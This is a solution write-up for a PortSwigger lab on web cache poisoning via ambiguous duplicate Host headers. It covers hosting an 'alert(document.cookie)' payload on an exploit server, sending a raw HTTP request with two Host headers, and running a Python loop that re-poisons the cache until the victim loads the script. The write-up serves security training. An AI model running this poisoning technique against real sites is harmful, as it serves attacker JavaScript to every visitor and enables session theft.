# PortSwigger Lab: Web Cache Poisoning via Ambiguous Requests

- **Lab Name:** Web cache poisoning via ambiguous requests
- **Topic:** HTTP Host Header Attacks
- **Vulnerability Type:** Web Cache Poisoning (via Host header / duplicate Host header)
- **Difficulty:** Practitioner
- **Status:** Solved (banner-verified 27 Nov 2026)
- **Instance:** https://0aed00a80322d281808d03d700e100b1.h1-web-security-academy.net/ (h1 edge)

## Solution

The home page loads a JavaScript file from a host-relative URL:

```html
<script src="//<lab-host>/resources/js/tracking.js"></script>
```

The front-end server and the cache disagree about how to handle a request
carrying **two Host headers**. The front-end validates the first Host header
(the real lab host) and forwards the request, but the back-end application
uses the **second** Host header when it builds the page. So a request with:

```
Host: 0aed00a80322d281808d03d700e100b1.h1-web-security-academy.net
Host: exploit-0aaf000e0353d27b80b7025901580043.exploit-server.net
```

makes the back-end generate a page whose `tracking.js` URL points at the
attacker's exploit server — and that poisoned page gets stored in the cache
under the normal home-page URL. Every later visitor (including the victim
bot) is then served the poisoned page and their browser loads the attacker's
JavaScript.

### Step 1 — Host the malicious JavaScript on the exploit server

Exploit server (taken from the lab page itself, never guessed):
`https://exploit-0aaf000e0353d27b80b7025901580043.exploit-server.net`

Stored the file `/resources/js/tracking.js` with body `alert(document.cookie)`
using the exploit server's store function (formAction=STORE, urlIsHttps=on,
responseFile=/resources/js/tracking.js, responseHead=
`HTTP/1.1 200 OK\r\nContent-Type: application/javascript`, responseBody=
`alert(document.cookie)`). Verified it served with HTTP 200:

```
GET https://exploit-0aaf000e0353d27b80b7025901580043.exploit-server.net/resources/js/tracking.js
-> 200  alert(document.cookie)
```

### Step 2 — Send the poison request as raw HTTP

The lab sits behind an h1 edge that routes by the `_lab` session cookie, so
the request must carry the session cookies exactly as set. Python
`requests` mangles the `_lab` cookie value when sending, breaking edge
routing (403), so the poison request is sent as raw HTTP through the proxy
CONNECT tunnel (helper `~/workspace/scripts/ps_rawhttp.py`):

```
GET / HTTP/1.1
Host: 0aed00a80322d281808d03d700e100b1.h1-web-security-academy.net
Host: exploit-0aaf000e0353d27b80b7025901580043.exploit-server.net
Cookie: session=<session>; _lab=<lab cookie>
User-Agent: Mozilla/5.0
```

A first probe with a cache-buster (`/?cb=poison1`) proved the mechanism:
the response came back `X-Cache: miss` with the `tracking.js` URL rewritten
to the exploit server host.

### Step 3 — Re-poison continuously until the victim visits (the key step)

The first attempt used a single poison request and then only polled for the
solved banner for 300 seconds — **it failed**. The reason: the cached home
page has `Cache-Control: max-age=30`, so a poisoned cache entry expires 30
seconds after it is stored, and the victim bot visits on its own schedule.
A single poison is very likely to expire before the victim arrives, and
every clean request (including my own banner polls) re-caches a clean copy.

The working approach is a tight loop that re-poisons every ~5 seconds and
polls the banner in between, keeping the poisoned entry fresh until the
victim's visit lands inside a poisoned window:

```python
# /tmp/hh/lab3_retry.py — loop for up to 420 s
while time.time() - start < 420:
    st, hdrs, body = raw_request(h3, "GET", "/",
        [("Host", h3), ("Host", es3), ("Cookie", ck),
         ("User-Agent", "Mozilla/5.0")])
    # check the tracking.js src in the response (not just "exploit host
    # in body" — the lab banner itself links to the exploit server)
    pois = src_is_poisoned(body)   # tracking.js src points at es3?
    r = s.get(b3 + "/")            # poll for the banner
    if "Congratulations" in r.text and "solved the lab" in r.text:
        print("SOLVED!"); break
    time.sleep(5)
```

Observed run: the cache was still serving a clean hit for the first ~30 s,
then at t=35 s the entry expired (`X-Cache: miss`) and the poison took;
the loop kept it poisoned (6 poisoned responses seen) and the victim visited
around t=70 s — `SOLVED!`, banner confirmed on the home page.

## Practical Explanation

Web cache poisoning works when an attacker can make a cache store a response
that was generated for a different (attacker-controlled) input, and the cache
then serves that response to other users. Here the "unkeyed input" is the
second Host header: the cache key is only the URL path, but the response
content depends on a header the cache ignores. The front-end and the
back-end disagree about which Host header is authoritative (an "ambiguous
request"), which is what makes the poison possible. The victim's browser
then executes attacker JavaScript in the context of the real site — in this
lab `alert(document.cookie)` is enough to prove it; in the real world the
same primitive steals sessions.

## Lessons Learned

- **Cache poisoning is a race, not a one-shot.** A poisoned entry with a
  short `max-age` (30 s here) expires before a victim who visits on their
  own schedule. Re-poison in a loop and poll for the result; a single
  attempt followed by passive waiting is likely to fail.
- **Check the right signal.** The exploit-server hostname appears in the
  lab page anyway (the "Go to exploit server" link in the lab banner), so
  "exploit host in body" is a false positive. The real check is the
  `tracking.js` `src` attribute.
- **Send cookies as a raw header on this edge.** The `requests` cookie jar
  mangles the `_lab` value and breaks routing; building the `Cookie` header
  from the jar values (or using raw HTTP) is required.
- **Verify the store first.** Confirm the exploit-server file serves 200
  with the intended body before spending time poisoning.
